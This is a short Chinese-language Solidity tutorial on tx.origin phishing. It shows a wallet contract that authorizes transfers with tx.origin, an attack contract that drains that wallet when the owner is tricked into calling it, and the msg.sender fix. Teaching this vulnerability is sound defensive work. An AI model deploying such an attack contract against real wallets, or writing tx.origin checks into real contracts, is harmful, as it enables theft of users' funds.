# tx.origin钓鱼

`msg.sender` 和 `tx.origin` 的区别是什么？

如果 合约A 调用B, B调用C,  在C中 msg.sender 是B, tx.origin 是A.

漏洞描述：

恶意合约可以欺骗 合约所有者调用只有合约所有者才可以调用的函数。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/*
钱包是一个简单的合约，只有所有者才能转移 以太币到另一个地址.
Wallet.transfer() 使用 tx.origin 来检查 调用者是所有者。让我们看看我们如何破解这个合约
*/

/*
1. Alice 用 10 个 Ether 部署钱包 
2. Eve 使用 Alice 的钱包合约地址部署 Attack。 
3. Eve 欺骗 Alice 调用 Attack.attack() 
4. Eve 成功从 Alice 的钱包中偷走了 Ether

Alice 被骗调用 Attack.attack()。
在 Attack.attack() 内部，它 请求将 Alice 钱包中的所有资金转移到 Eve 的地址。
由于 Wallet.transfer() 中的 tx.origin 等于 Alice 的地址， 它授权转让。钱包将所有以太币转移给 Eve。
*/

contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        require(tx.origin == owner, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        // here
        owner = payable(msg.sender);
    }
	// alice call  
	// tx.origin is alice, msg.sender = attack
    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}
```



### 预防技术

使用 `msg.sender` 而不是 `tx.origin`

```solidity
function transfer(address payable _to, uint256 _amount) public {
  require(msg.sender == owner, "Not owner");

  (bool sent, ) = _to.call{value: _amount}("");
  require(sent, "Failed to send Ether");
}
```

